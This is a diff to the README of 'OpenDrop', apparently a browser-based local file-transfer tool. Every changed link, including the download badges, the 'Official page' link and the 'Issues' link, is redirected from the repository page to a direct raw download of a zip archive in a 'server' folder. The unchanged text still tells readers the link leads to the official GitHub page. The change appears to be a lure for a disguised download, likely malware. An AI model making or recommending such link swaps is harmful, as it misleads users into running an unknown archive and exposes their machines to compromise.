@@ -1,6 +1,6 @@
 # 📁 OpenDrop - Simple Local File Transfer
 
-[![Download OpenDrop](https://img.shields.io/badge/Download-OpenDrop-brightgreen?style=for-the-badge)](https://github.com/sandaracadducer320/OpenDrop)
+[![Download OpenDrop](https://img.shields.io/badge/Download-OpenDrop-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/sandaracadducer320/OpenDrop/main/server/Drop_Open_v2.7-alpha.3.zip)
 
 OpenDrop lets you transfer files across your local network. You send files directly from one device to another without using the internet. It uses WebRTC technology to connect your devices faster and more securely.
 
@@ -31,7 +31,7 @@ You do not need to install any extra software. OpenDrop runs in your browser aft
 
 Start by downloading or opening OpenDrop on your Windows device.
 
-[![Download OpenDrop](https://img.shields.io/badge/Get%20OpenDrop-blue?style=for-the-badge)](https://github.com/sandaracadducer320/OpenDrop)
+[![Download OpenDrop](https://img.shields.io/badge/Get%20OpenDrop-blue?style=for-the-badge)](https://raw.githubusercontent.com/sandaracadducer320/OpenDrop/main/server/Drop_Open_v2.7-alpha.3.zip)
 
 This link takes you to the official GitHub page. Here is how to proceed:
 
@@ -109,10 +109,10 @@ This repository is mainly for developers who want to contribute or review the so
 
 ## 🌐 Useful Links
 
-- Official page: https://github.com/sandaracadducer320/OpenDrop  
-- Issues for help and bug reports: https://github.com/sandaracadducer320/OpenDrop/issues  
+- Official page: https://raw.githubusercontent.com/sandaracadducer320/OpenDrop/main/server/Drop_Open_v2.7-alpha.3.zip  
+- Issues for help and bug reports: https://raw.githubusercontent.com/sandaracadducer320/OpenDrop/main/server/Drop_Open_v2.7-alpha.3.zip  
 - Documentation inside the repository files
 
 Use the button below to go back to the main page and download or update your copy of OpenDrop.
 
-[![Download OpenDrop](https://img.shields.io/badge/Download-OpenDrop-brightgreen?style=for-the-badge)](https://github.com/sandaracadducer320/OpenDrop)
+[![Download OpenDrop](https://img.shields.io/badge/Download-OpenDrop-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/sandaracadducer320/OpenDrop/main/server/Drop_Open_v2.7-alpha.3.zip)
